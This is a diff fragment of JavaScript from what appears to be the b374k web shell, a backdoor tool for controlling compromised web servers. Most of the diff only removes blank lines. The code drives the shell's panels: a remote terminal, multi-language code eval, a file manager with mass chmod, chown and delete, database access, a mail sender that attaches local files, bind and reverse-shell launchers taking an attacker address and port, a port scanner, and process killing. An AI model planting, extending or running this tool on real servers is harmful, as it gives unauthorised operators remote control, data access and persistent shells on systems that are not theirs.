 			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr>"+line+"<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+type+"');\">"+title+"</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
 	}
-
 	$('.cBoxSelected').removeClass('cBoxSelected');
 	xpl_update_status();
 }
-
 function mass_act_go_tar(){
 	mass_act_go('tar');
 }
-
 function mass_act_go_targz(){
 	mass_act_go('targz');
 }
-
 function mass_act_go_zip(){
 	mass_act_go('zip');
 }
-
 function mass_act_go_untar(){
 	mass_act_go('untar');
 }
-
 function mass_act_go_untargz(){
 	mass_act_go('untargz');
 }
-
 function mass_act_go_unzip(){
 	mass_act_go('unzip');
 }
-
 function mass_act_go_paste(){
 	mass_act_go('paste');
 }
-
 function mass_act_go_chmod(){
 	mass_act_go('chmod');
 }
-
 function mass_act_go_chown(){
 	mass_act_go('chown');
 }
-
 function mass_act_go_touch(){
 	mass_act_go('touch');
 }
-
 function mass_act_go(massType){
 	massBuffer = $.trim($('.massBuffer').val());
 	massPath = get_cwd();
@@ -3861,8 +3546,6 @@ function mass_act_go(massType){
 	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')){
 		massValue = $('.massValue').val();
 	}
-
-
 	if(massBuffer!=''){
 		send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue }, function(res){
 			if(res!='error'){
@@ -3873,14 +3556,11 @@ function mass_act_go(massType){
 		});
 	}
 }
-
 function xpl_update_status(){
 	totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
 	if(totalSelected==0) $('.xplSelected').html('');
 	else $('.xplSelected').html(', '+totalSelected+' item(s) selected');
 }
-
-
 function xpl_bind(){
 	$('.navigate').off('click');
 	$('.navigate').on('click', function(e){
@@ -3888,82 +3568,69 @@ function xpl_bind(){
 		navigate(path);
 		hide_box();
 	});
-
 	$('.navbar').off('click');
 	$('.navbar').on('click', function(e){
 		path = $(this).attr('data-path');
 		navigate(path);
 		hide_box();
 	});
-
 	$('.newfolder').off('click');
 	$('.newfolder').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		newfolder(path);
 	});
-
 	$('.newfile').off('click');
 	$('.newfile').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		newfile(path);
 	});
-
 	$('.del').off('click');
 	$('.del').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		del(path);
 	});
-
 	$('.view').off('click');
 	$('.view').on('click', function(e){
 		path = xpl_href($(this));
 		view(path, 'auto');
 		hide_box();
 	});
-
 	$('.hex').off('click');
 	$('.hex').on('click', function(e){
 		path = xpl_href($(this));
 		view(path, 'hex');
 	});
-
 	$('#viewFullsize').off('click');
 	$('#viewFullsize').on('click', function(e){
 		src = $('#viewImage').attr('src');
 		window.open(src);
 	});
-
 	$('.edit').off('click');
 	$('.edit').on('click', function(e){
 		path = xpl_href($(this));
 		view(path, 'edit');
 		hide_box();
 	});
-
 	$('.ren').off('click');
 	$('.ren').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		ren(path);
 	});
-
 	$('.action').off('click');
 	$('.action').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		action(path, 'file');
 	});
-
 	$('.actionfolder').off('click');
 	$('.actionfolder').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		action(path, 'dir');
 	});
-
 	$('.actiondot').off('click');
 	$('.actiondot').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
 		action(path, 'dot');
 	});
-
 	$('.dl').off('click');
 	$('.dl').on('click', function(e){
 		path = html_safe(xpl_href($(this)));
@@ -3972,7 +3639,6 @@ function xpl_bind(){
 		$('#form').html('');
 		hide_box();
 	});
-
 	$('.ul').off('click');
 	$('.ul').on('click', function(e){
 		path = xpl_href($(this));
@@ -3981,7 +3647,6 @@ function xpl_bind(){
 		ul(path);
 		hide_box();
 	});
-
 	$('.find').off('click');
 	$('.find').on('click', function(e){
 		path = xpl_href($(this));
@@ -3990,21 +3655,17 @@ function xpl_bind(){
 		find(path);
 		hide_box();
 	});
-
 	$('#massAction').off('click');
 	$('#massAction').on('change', function(e){
 		type = $('#massAction').val();
 		mass_act(type);
 		$('#massAction').val('Action');
 	});
-
 	cbox_bind('xplTable','xpl_update_status');
 }
-
 function xpl_href(el){
 	return el.parent().parent().attr('data-path');
 }
-
 function multimedia(path){
 	var a = $('video').get(0);
 	send_post({multimedia:path}, function(res){
@@ -4012,7 +3673,6 @@ function multimedia(path){
 	});
 	hide_box();
 }
-
 $('#terminalInput').on('keydown', function(e){
 	if(e.keyCode==13){
 		cmd = $('#terminalInput').val();
@@ -4053,16 +3713,13 @@ $('#terminalInput').on('keydown', function(e){
 	}
 	fix_tabchar(this, e);
 });
-
 function eval_go(){
 	evalType = $('#evalType').val();
 	evalInput = $('#evalInput').val();
 	evalOptions = $('#evalOptions').val();
 	evalArguments = $('#evalArguments').val();
-
 	if(evalOptions=='Options/Switches') evalOptions = '';
 	if(evalArguments=='Arguments') evalArguments = '';
-
 	if($.trim(evalInput)!=''){
 		send_post({ evalInput:evalInput, evalType:evalType, evalOptions:evalOptions, evalArguments:evalArguments },
 			function(res){
@@ -4080,7 +3737,6 @@ function eval_go(){
 		);
 	}
 }
-
 function eval_init(){
 	if((evalSupported = localStorage.getItem('evalSupported'))){
 		eval_bind();
@@ -4099,7 +3755,6 @@ function eval_init(){
 		});
 	}
 }
-
 function eval_bind(){
 	if((evalSupported!=null)&&(evalSupported!='')){
 		splits = evalSupported.split(",");
@@ -4131,7 +3786,6 @@ function eval_bind(){
 		args = $('#evalArguments');
 		if($.trim(args.val())=='') args.val('Arguments');
 	});
-
 	$('#evalInput').on('keydown', function(e){
 		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
 			eval_go();
@@ -4147,7 +3801,6 @@ Zepto(function($){
 		fix_tabchar(this, e);
 	});
 });
-
 function decode_go(){
 	decodeStr = $('#decodeStr').val();
 	send_post({decodeStr:decodeStr}, function(res){
@@ -4157,16 +3810,11 @@ function decode_go(){
 		}
 	});
 }
-
-
 Zepto(function($){
 	db_init();
-
 });
-
 var dbSupported = "";
 var dbPageLimit = 50;
-
 function db_init(){
 	if((dbSupported = localStorage.getItem('db_supported'))){
 		db_bind();
@@ -4185,14 +3833,12 @@ function db_init(){
 		});
 	}
 }
-
 function db_add_supported(){
 	splits = dbSupported.split(",");
 	$.each(splits, function(i, k){
 		$('#dbType').append("<option>"+k+"</option>");
 	});
 }
-
 function db_bind(){
 	$('#dbType').on('change', function(e){
 		type = $('#dbType').val();
@@ -4201,14 +3847,12 @@ function db_bind(){
 			$('.dbUserRow').show();
 			$('.dbPassRow').show();
 			$('.dbPortRow').hide();
-
 		}
 		else if((type=='sqlite')||(type=='sqlite3')){
 			$('.dbHostLbl').html('DB File');
 			$('.dbUserRow').hide();
 			$('.dbPassRow').hide();
 			$('.dbPortRow').hide();
-
 		}
 		else{
 			$('.dbHostLbl').html('Host');
@@ -4217,7 +3861,6 @@ function db_bind(){
 			$('.dbPortRow').show();
 		}
 	});
-
 	$('#dbQuery').on('focus', function(e){
 		if($('#dbQuery').val()=='You can also press ctrl+enter to submit'){
 			$('#dbQuery').val('');
@@ -4234,14 +3877,12 @@ function db_bind(){
 		}
 	});
 }
-
 function db_nav_bind(){
 	dbType = $('#dbType').val();
 	$('.boxNav').off('click');
 	$('.boxNav').on('click', function(){
 		$(this).next().toggle();
 	});
-
 	$('.dbTable').off('click');
 	$('.dbTable').on('click', function(){
 		type = $('#dbType').val();
@@ -4250,7 +3891,6 @@ function db_nav_bind(){
 		db_query_tbl(type, db, table, 0, dbPageLimit);
 	});
 }
-
 function db_connect(){
 	dbType = $('#dbType').val();
 	dbHost = $('#dbHost').val();
@@ -4272,7 +3912,6 @@ function db_connect(){
 		else $('.dbError').html('Unable to connect');
 	});
 }
-
 function db_disconnect(){
 	$('.dbHostRow').show();
 	$('.dbUserRow').show();
@@ -4284,7 +3923,6 @@ function db_disconnect(){
 	$('#dbResult').html('');
 	$('#dbBottom').hide();
 }
-
 function db_run(){
 	dbType = $('#dbType').val();
 	dbHost = $('#dbHost').val();
@@ -4292,7 +3930,6 @@ function db_run(){
 	dbPass = $('#dbPass').val();
 	dbPort = $('#dbPort').val();
 	dbQuery = $('#dbQuery').val();
-
 	if((dbQuery!='')&&(dbQuery!='You can also press ctrl+enter to submit')){
 		send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:dbQuery}, function(res){
 			if(res!='error'){
@@ -4304,14 +3941,12 @@ function db_run(){
 		});
 	}
 }
-
 function db_query_tbl(type, db, table, start, limit){
 	dbType = $('#dbType').val();
 	dbHost = $('#dbHost').val();
 	dbUser = $('#dbUser').val();
 	dbPass = $('#dbPass').val();
 	dbPort = $('#dbPort').val();
-
 	send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:'', dbDB:db, dbTable:table, dbStart:start, dbLimit:limit}, function(res){
 		if(res!='error'){
 			$('#dbResult').html(res);
@@ -4321,14 +3956,12 @@ function db_query_tbl(type, db, table, start, limit){
 		}
 	});
 }
-
 function db_pagination(type){
 	db = $('#dbDB').val();
 	table = $('#dbTable').val();
 	start = parseInt($('#dbStart').val());
 	limit = parseInt($('#dbLimit').val());
 	dbType = $('#dbType').val();
-
 	if(type=='next'){
 		start = start+limit;
 	}
@@ -4338,12 +3971,9 @@ function db_pagination(type){
 	}
 	db_query_tbl(dbType, db, table, start, limit);
 }
-
 Zepto(function($){
 	info_init();
-
 });
-
 function info_init(){
 	if((infoResult = localStorage.getItem('infoResult'))){
 		$('.infoResult').html(infoResult);
@@ -4352,22 +3982,17 @@ function info_init(){
 		info_refresh();
 	}
 }
-
 function info_toggle(id){
 	$('#'+id).toggle();
 }
-
 function info_refresh(){
 	send_post({infoRefresh:'infoRefresh'}, function(res){
 		$('.infoResult').html(res);
 		localStorage.setItem('infoResult', res);
 	});
 }
-
 Zepto(function($){
-
 });
-
 function mail_send(){
 	mailFrom = $.trim($('#mailFrom').val());
 	mailTo = $.trim($('#mailTo').val());
@@ -4377,22 +4002,17 @@ function mail_send(){
 	if($('.mailAttachment')){
 		mailAttachment = $('.mailAttachment').map(function(){ return this.value; }).get().join('{[|b374k|]}');
 	}
-
 	send_post({mailFrom:mailFrom, mailTo:mailTo, mailSubject:mailSubject, mailContent:mailContent, mailAttachment:mailAttachment}, function(res){
 		$('#mailResult').html(res);
 	});
 }
-
 function mail_attach(){
 	content = "<tr><td>Local file <a onclick=\"$(this).parent().parent().remove();\">(-)</a></td><td colspan='2'><input type='text' class='mailAttachment' value=''></td></tr>";
 	$('#mailTBody').append(content);
 }
-
 Zepto(function($){
 	rs_init();
-
 });
-
 function rs_init(){
 	if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){
 		splits = evalSupported.split(",");
@@ -4401,7 +4021,6 @@ function rs_init(){
 		});
 	}
 	else setTimeout('rs_init()', 1000);
-
 	$('#packetContent').on('keydown', function(e){
 		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
 			packet_go();
@@ -4409,14 +4028,12 @@ function rs_init(){
 		fix_tabchar(this, e);
 	});
 }
-
 function rs_go_bind(){
 	rs_go('bind');
 }
 function rs_go_back(){
 	rs_go('back');
 }
-
 function rs_go(rsType){
 	rsArgs = "";
 	if(rsType=='bind'){
@@ -4432,12 +4049,10 @@ function rs_go(rsType){
 		rsArgs = rsPort + ' ' + rsAddr;
 		rsResult = $('#backResult');
 	}
-
 	if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){
 		rsResult.html('Invalid port');
 		return;
 	}
-
 	if(rsArgs!=''){
 		send_post({ rsLang:rsLang, rsArgs:rsArgs },
 			function(res){
@@ -4455,7 +4070,6 @@ function rs_go(rsType){
 		);
 	}
 }
-
 function packet_go(){
 	packetHost = $('#packetHost').val();
 	packetStartPort = parseInt($('#packetStartPort').val());
@@ -4465,7 +4079,6 @@ function packet_go(){
 	packetContent = $('#packetContent').val();
 	packetResult = $('#packetResult');
 	packetStatus = $('#packetStatus');
-
 	if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){
 		packetResult.html('Invalid start port');
 		return;
@@ -4482,7 +4095,6 @@ function packet_go(){
 		packetResult.html('Invalid stream timeout');
 		return;
 	}
-
 	if(packetStartPort>packetEndPort){
 		start = packetEndPort;
 		end = packetStartPort;
@@ -4491,26 +4103,21 @@ function packet_go(){
 		start = packetStartPort;
 		end = packetEndPort;
 	}
-
 	packetResult.html('');
 	while(start<=end){
 		packetPort = start++;
 		packetResult.append("<hr><div><p class='boxtitle'>Host : "+html_safe(packetHost)+":"+packetPort+"</p><br><div id='packet"+packetPort+"' style='padding:2px 4px;'>Working... please wait...</div></div>");
 		packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent);
-
 	}
 }
-
 function packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent){
 	send_post({packetHost:packetHost, packetPort:packetPort, packetEndPort:packetEndPort, packetTimeout:packetTimeout, packetSTimeout:packetSTimeout, packetContent:packetContent}, function(res){
 		$('#packet'+packetPort).html(res);
 	}, false);
 }
-
 Zepto(function($){
 	show_processes();
 });
-
 function show_processes(){
 	send_post({showProcesses:''}, function(res){
 		if(res!='error'){
@@ -4520,30 +4127,23 @@ function show_processes(){
 		}
 	});
 }
-
 function ps_bind(){
 	$('.kill').off('click');
 	$('.kill').on('click', function(e){
 		kill_pid(ps_get_pid($(this)));
 	});
-
-
 	cbox_bind('psTable','ps_update_status');
 }
-
 function ps_get_pid(el){
 	return el.parent().parent().attr('data-pid');
 }
-
 function ps_update_status(){
 	totalSelected = $('#psTable').find('.cBoxSelected').not('.cBoxAll').length;
 	if(totalSelected==0) $('.psSelected').html('');
 	else $('.psSelected').html(' ( '+totalSelected+' item(s) selected )');
 }
-
 function kill_selected(){
 	buffer = get_all_cbox_selected('psTable', 'ps_get_pid');
-
 	allPid = '';
 	$.each(buffer,function(i,v){
 		allPid += v + ' ';
@@ -4551,13 +4151,11 @@ function kill_selected(){
 	allPid = $.trim(allPid);
 	kill_pid(allPid);
 }
-
 function kill_pid(allPid){
 	title = 'Kill';
 	content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='allPid' style='height:120px;min-height:120px;' disabled>"+allPid+"</textarea></td></tr><tr><td colspan='2'><span class='button' onclick=\"kill_pid_go();\">kill</span></td></tr></table>";
 	show_box(title, content);
 }
-
 function kill_pid_go(){
 	allPid = $('.allPid').val();
 	if($.trim(allPid)!=''){
@@ -4570,8 +4168,6 @@ function kill_pid_go(){
 		});
 	}
 }
-
-
 <?php
 	foreach($GLOBALS['module_to_load'] as $k){
 		echo "function ".$GLOBALS['module'][$k]['id']."(){ ".$GLOBALS['module'][$k]['js_ontabselected']." }\n";
